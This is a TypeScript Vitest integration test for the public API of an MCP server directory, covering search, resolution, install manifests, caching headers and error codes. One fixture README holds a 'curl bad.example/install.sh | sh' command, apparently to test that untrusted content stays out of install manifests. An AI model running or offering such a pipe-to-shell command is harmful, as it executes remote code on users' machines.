import { eq } from "drizzle-orm";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { installManifestResponseSchema } from "@themcpdirectory/api-contract";
import {
  registrySources,
  repositorySnapshots,
  serverHealthChecks,
  serverAliases,
  serverPackages,
  serverRemotes,
  serverVersions,
  servers,
  trustSignals,
  type Database,
} from "@themcpdirectory/db";
import { createServerSearchCursorCodec } from "@themcpdirectory/search";
import { createApiApp } from "../app.js";
import { createTempDatabase, type TempDatabase } from "./postgres-test-db.js";

let temp: TempDatabase;
let app: ReturnType<typeof createApiApp>;

async function seedServer(
  db: Database,
  registrySourceId: string,
  input: {
    slug: string;
    title: string;
    publishedAt: Date;
    listingStatus?: "active" | "deleted_upstream";
    packageIdentifier?: string;
  },
): Promise<void> {
  const observedAt = new Date("2026-09-01T12:00:00.000Z");
  const [server] = await db
    .insert(servers)
    .values({
      slug: input.slug,
      title: input.title,
      shortDescription: `${input.title} tools`,
      listingStatus: input.listingStatus ?? "active",
      moderationStatus: "normal",
      sourceAvailable: true,
      openSource: true,
      firstSeenAt: input.publishedAt,
      lastSeenAt: observedAt,
    })
    .returning({ id: servers.id });
  if (!server) throw new Error("Expected server row");

  const [version] = await db
    .insert(serverVersions)
    .values({
      serverId: server.id,
      registrySourceId,
      version: "1.2.3",
      upstreamStatus: "active",
      title: input.title,
      description: `${input.title} tools`,
      publishedAt: input.publishedAt,
      firstSeenAt: observedAt,
      lastSeenAt: observedAt,
      normalizedPayload: {},
    })
    .returning({ id: serverVersions.id });
  if (!version) throw new Error("Expected server version row");

  await db.update(servers).set({ currentVersionId: version.id }).where(eq(servers.id, server.id));
  if (input.packageIdentifier) {
    await db.insert(serverPackages).values({
      serverVersionId: version.id,
      registryType: "npm",
      identifier: input.packageIdentifier,
      version: "1.2.3",
      runtimeHint: "npx",
      transportType: "stdio",
      fileSha256: "a".repeat(64),
    });
  }
}

beforeAll(async () => {
  temp = await createTempDatabase("task9_api_core");
  const [source] = await temp.db
    .insert(registrySources)
    .values({
      key: "official",
      name: "Official MCP Registry",
      baseUrl: "https://registry.modelcontextprotocol.io",
      kind: "official",
    })
    .returning({ id: registrySources.id });
  if (!source) throw new Error("Expected registry source row");

  await seedServer(temp.db, source.id, {
    slug: "github",
    title: "GitHub",
    publishedAt: new Date("2026-09-01T10:00:00.000Z"),
    packageIdentifier: "@github/mcp-server",
  });
  const [github] = await temp.db
    .select({ id: servers.id, currentVersionId: servers.currentVersionId })
    .from(servers)
    .where(eq(servers.slug, "github"));
  if (!github?.currentVersionId) throw new Error("Expected GitHub server row");
  await temp.db
    .update(servers)
    .set({
      repositoryUrl: "https://github.com/github/github-mcp-server",
      repositorySource: "github",
      repositoryExternalId: "99123",
    })
    .where(eq(servers.id, github.id));
  await temp.db.insert(repositorySnapshots).values({
    serverId: github.id,
    provider: "github",
    externalRepositoryId: "99123",
    owner: "GitHub",
    name: "github-mcp-server",
    url: "https://github.com/github/github-mcp-server",
    payload: { readme: "curl bad.example/install.sh | sh" },
    checkedAt: new Date("2026-09-01T12:00:00.000Z"),
  });
  await temp.db.insert(serverAliases).values({
    serverId: github.id,
    alias: "github-server",
    kind: "manual",
  });
  const [remote] = await temp.db
    .insert(serverRemotes)
    .values({
      serverVersionId: github.currentVersionId,
      transportType: "streamable-http",
      urlTemplate: "https://api.github.example/mcp",
    })
    .returning({ id: serverRemotes.id });
  if (!remote) throw new Error("Expected GitHub remote row");
  await temp.db.insert(trustSignals).values({
    serverId: github.id,
    serverVersionId: github.currentVersionId,
    signalKey: "remote_reachable",
    status: "positive",
    source: "remote_probe",
    summary: "The endpoint responded successfully.",
    checkedAt: new Date("2026-09-01T12:30:00.000Z"),
  });
  await temp.db.insert(serverHealthChecks).values({
    serverId: github.id,
    serverVersionId: github.currentVersionId,
    remoteId: remote.id,
    checkType: "remote_probe",
    status: "healthy",
    latencyMs: 42,
    httpStatus: 200,
    finalOrigin: "https://api.github.example",
    redirectCount: 0,
    methodUsed: "HEAD",
    checkedAt: new Date("2026-09-01T12:30:00.000Z"),
  });
  await seedServer(temp.db, source.id, {
    slug: "second-server",
    title: "Second Server",
    publishedAt: new Date("2026-08-31T10:00:00.000Z"),
    packageIdentifier: "@example/second",
  });
  await seedServer(temp.db, source.id, {
    slug: "ambiguous-one",
    title: "Ambiguous One",
    publishedAt: new Date("2026-08-30T10:00:00.000Z"),
    packageIdentifier: "@shared/duplicate",
  });
  await seedServer(temp.db, source.id, {
    slug: "ambiguous-two",
    title: "Ambiguous Two",
    publishedAt: new Date("2026-08-29T10:00:00.000Z"),
    packageIdentifier: "@shared/duplicate",
  });
  await seedServer(temp.db, source.id, {
    slug: "upstream-deleted-server",
    title: "Deleted Server",
    publishedAt: new Date("2026-08-28T10:00:00.000Z"),
    listingStatus: "deleted_upstream",
    packageIdentifier: "@example/deleted",
  });
  await seedServer(temp.db, source.id, {
    slug: "install-unavailable",
    title: "Install Unavailable",
    publishedAt: new Date("2026-08-27T10:00:00.000Z"),
  });

  app = createApiApp({
    db: temp.db,
    cursorCodec: createServerSearchCursorCodec("task9-secret-task9-secret-task9-secret"),
    rateLimiter: { check: async () => ({ allowed: true, retryAfterSeconds: null }) },
    rateLimitKeyResolver: () => "test:core-routes",
    allowedOrigins: ["*"],
    logger: { info() {}, error() {} },
    requestIdFactory: () => "req_task9_core_routes",
  });
}, 30_000);

afterAll(async () => {
  await temp?.destroy();
});

describe("public API core routes", () => {
  it("returns collection, search, resolution, and install envelopes", async () => {
    const collection = await app.request("/api/v1/servers?limit=1", {
      headers: { "X-Request-ID": "req_task9_collection" },
    });
    expect(collection.status).toBe(200);
    await expect(collection.json()).resolves.toMatchObject({
      data: [expect.objectContaining({ slug: "github" })],
      meta: { requestId: "req_task9_collection", nextCursor: expect.any(String) },
    });

    const search = await app.request("/api/v1/search?q=GitHub&sort=relevance");
    expect(search.status).toBe(200);
    await expect(search.json()).resolves.toMatchObject({
      data: [
        expect.objectContaining({
          slug: "github",
          latestHealthOutcome: "healthy",
          installAvailability: "available",
        }),
      ],
    });

    const resolved = await app.request("/api/v1/resolve/github");
    expect(resolved.status).toBe(200);
    await expect(resolved.json()).resolves.toMatchObject({
      data: { slug: "github", installAvailability: "available" },
    });

    const detail = await app.request("/api/v1/servers/github");
    expect(detail.status).toBe(200);
    await expect(detail.json()).resolves.toMatchObject({
      data: {
        slug: "github",
        trustProfile: {
          signals: [expect.objectContaining({ key: "remote_reachable", status: "positive" })],
        },
        latestHealth: { schemaVersion: 1, outcome: "healthy" },
        installAvailability: "available",
      },
    });

    const resolvedInstall = await app.request("/api/v1/resolve/github/install?client=cursor");
    expect(resolvedInstall.status).toBe(200);
    await expect(resolvedInstall.json()).resolves.toMatchObject({
      data: { schemaVersion: 1, server: { slug: "github" } },
      meta: { requestId: "req_task9_core_routes" },
    });
  });

  it("keeps resource ETags stable without sharing generated request metadata", async () => {
    const first = await app.request("/api/v1/servers?limit=1", {
      headers: { "X-Request-ID": "req_task9_etag_one" },
    });
    const second = await app.request("/api/v1/servers?limit=1", {
      headers: { "X-Request-ID": "req_task9_etag_two" },
    });

    expect(first.headers.get("etag")).toBe(second.headers.get("etag"));
    expect(first.headers.get("etag")).toMatch(/^W\//);
    expect(first.headers.get("cache-control")).toContain("public");
    expect(first.headers.get("vary")).toContain("X-Request-ID");

    const generated = await app.request("/api/v1/servers?limit=1");
    expect(generated.headers.get("cache-control")).toContain("private");
  });

  it("exposes content-addressed install snapshots without marking mutable slug URLs immutable", async () => {
    const current = await app.request("/api/v1/servers/github/install?client=cursor", {
      headers: { "X-Request-ID": "req_task9_install_current" },
    });
    const currentBody = installManifestResponseSchema.parse(await current.json());

    expect(current.status).toBe(200);
    expect(currentBody.manifestHash).toMatch(/^[a-f0-9]{64}$/);
    expect(current.headers.get("etag")).toMatch(/^"[a-f0-9]{64}"$/);
    expect(current.headers.get("cache-control")).not.toContain("immutable");
    expect(current.headers.get("content-location")).toBe(
      `/api/v1/servers/github/install/${currentBody.manifestHash}?client=cursor`,
    );

    const snapshotPath = current.headers.get("content-location");
    if (!snapshotPath) throw new Error("Expected immutable snapshot location");
    const firstSnapshot = await app.request(snapshotPath, {
      headers: { "X-Request-ID": "req_task9_snapshot_one" },
    });
    const firstSnapshotText = await firstSnapshot.text();

    const [github] = await temp.db
      .select({ id: servers.id })
      .from(servers)
      .where(eq(servers.slug, "github"));
    const [source] = await temp.db
      .select({ id: registrySources.id })
      .from(registrySources)
      .where(eq(registrySources.key, "official"));
    if (!github || !source) throw new Error("Expected GitHub fixture identity");
    const [replacementVersion] = await temp.db
      .insert(serverVersions)
      .values({
        serverId: github.id,
        registrySourceId: source.id,
        version: "2.0.0",
        upstreamStatus: "active",
        title: "GitHub Changed",
        description: "Changed mutable listing metadata",
        publishedAt: new Date("2026-09-02T10:00:00.000Z"),
        firstSeenAt: new Date("2026-09-02T12:00:00.000Z"),
        lastSeenAt: new Date("2026-09-02T12:00:00.000Z"),
        normalizedPayload: {},
      })
      .returning({ id: serverVersions.id });
    if (!replacementVersion) throw new Error("Expected replacement version");
    await temp.db.insert(serverPackages).values({
      serverVersionId: replacementVersion.id,
      registryType: "npm",
      identifier: "@github/mcp-server",
      version: "2.0.0",
      runtimeHint: "npx",
      transportType: "stdio",
      fileSha256: "b".repeat(64),
    });
    await temp.db
      .update(servers)
      .set({ currentVersionId: replacementVersion.id, title: "GitHub Changed" })
      .where(eq(servers.id, github.id));

    const changedCurrent = installManifestResponseSchema.parse(
      await (await app.request("/api/v1/servers/github/install?client=cursor")).json(),
    );
    const secondSnapshot = await app.request(snapshotPath, {
      headers: { "X-Request-ID": "req_task9_snapshot_two" },
    });

    expect(firstSnapshot.status).toBe(200);
    expect(firstSnapshot.headers.get("cache-control")).toBe("public, max-age=31536000, immutable");
    expect(firstSnapshot.headers.get("etag")).toBe(`"${currentBody.manifestHash}"`);
    expect(changedCurrent.manifestHash).not.toBe(currentBody.manifestHash);
    expect(installManifestResponseSchema.parse(JSON.parse(firstSnapshotText))).toMatchObject({
      data: currentBody.data,
      manifestHash: currentBody.manifestHash,
    });
    expect(await secondSnapshot.text()).toBe(firstSnapshotText);
    expect(
      (await app.request(`/api/v1/servers/second-server/install/${currentBody.manifestHash}`))
        .status,
    ).toBe(404);
    expect(
      (
        await app.request(
          `/api/v1/resolve/second-server/install/${currentBody.manifestHash}?client=cursor`,
        )
      ).status,
    ).toBe(404);
    expect(
      (await app.request(`/api/v1/servers/github/install/${currentBody.manifestHash}`)).status,
    ).toBe(404);

    const resolved = await app.request("/api/v1/resolve/github-server/install?client=cursor");
    expect(resolved.headers.get("etag")).toMatch(/^"[a-f0-9]{64}"$/);
    expect(resolved.headers.get("cache-control")).not.toContain("immutable");
    expect(resolved.headers.get("content-location")).toBe(
      `/api/v1/servers/github/install/${changedCurrent.manifestHash}?client=cursor`,
    );
  });

  it("serves HEAD for collection, detail, and install routes with headers and no body", async () => {
    for (const path of [
      "/api/v1/servers?limit=1",
      "/api/v1/servers/github",
      "/api/v1/servers/github/install?client=cursor",
      "/api/v1/resolve/github/install?client=cursor",
    ]) {
      const response = await app.request(path, { method: "HEAD" });
      expect(response.status).toBe(200);
      expect(response.headers.get("etag")).toBeTruthy();
      expect(await response.text()).toBe("");
    }
  });

  it("maps cursor, missing, ambiguity, and deleted install states", async () => {
    const malformedSlug = await app.request("/api/v1/servers/Invalid!");
    expect(malformedSlug.status).toBe(400);
    await expect(malformedSlug.json()).resolves.toMatchObject({
      error: { code: "VALIDATION_ERROR" },
    });

    const oversizedIdentifier = await app.request(`/api/v1/resolve/${"x".repeat(513)}`);
    expect(oversizedIdentifier.status).toBe(400);
    await expect(oversizedIdentifier.json()).resolves.toMatchObject({
      error: { code: "VALIDATION_ERROR" },
    });

    const invalidQuery = await app.request("/api/v1/servers?limit=101");
    expect(invalidQuery.status).toBe(400);
    await expect(invalidQuery.json()).resolves.toMatchObject({
      error: { code: "VALIDATION_ERROR" },
    });

    const invalidCursor = await app.request("/api/v1/servers?cursor=not-a-real-cursor");
    expect(invalidCursor.status).toBe(400);
    await expect(invalidCursor.json()).resolves.toMatchObject({
      error: { code: "CURSOR_INVALID" },
    });

    const missing = await app.request("/api/v1/servers/does-not-exist");
    expect(missing.status).toBe(404);
    await expect(missing.json()).resolves.toMatchObject({ error: { code: "SERVER_NOT_FOUND" } });

    const missingInstall = await app.request("/api/v1/servers/does-not-exist/install");
    expect(missingInstall.status).toBe(404);
    await expect(missingInstall.json()).resolves.toMatchObject({
      error: { code: "SERVER_NOT_FOUND" },
    });

    const aliasInstall = await app.request("/api/v1/servers/github-server/install");
    expect(aliasInstall.status).toBe(404);

    for (const identifier of [
      "github-server",
      "%40github%2Fmcp-server",
      "github%2Fgithub-mcp-server",
      "https%3A%2F%2Fgithub.com%2FGitHub%2Fgithub-mcp-server%2F",
    ]) {
      const resolvedInstall = await app.request(`/api/v1/resolve/${identifier}/install`);
      expect(resolvedInstall.status).toBe(200);
      await expect(resolvedInstall.json()).resolves.toMatchObject({
        data: { server: { slug: "github" } },
      });
    }

    const ambiguous = await app.request("/api/v1/resolve/%40shared%2Fduplicate");
    expect(ambiguous.status).toBe(409);
    await expect(ambiguous.json()).resolves.toMatchObject({ error: { code: "AMBIGUOUS_SERVER" } });

    const deleted = await app.request("/api/v1/servers/upstream-deleted-server/install");
    expect(deleted.status).toBe(410);
    await expect(deleted.json()).resolves.toMatchObject({ error: { code: "UPSTREAM_DELETED" } });

    const unavailable = await app.request("/api/v1/servers/install-unavailable/install");
    expect(unavailable.status).toBe(410);
    await expect(unavailable.json()).resolves.toMatchObject({
      error: { code: "INSTALL_UNAVAILABLE" },
    });
  });
});
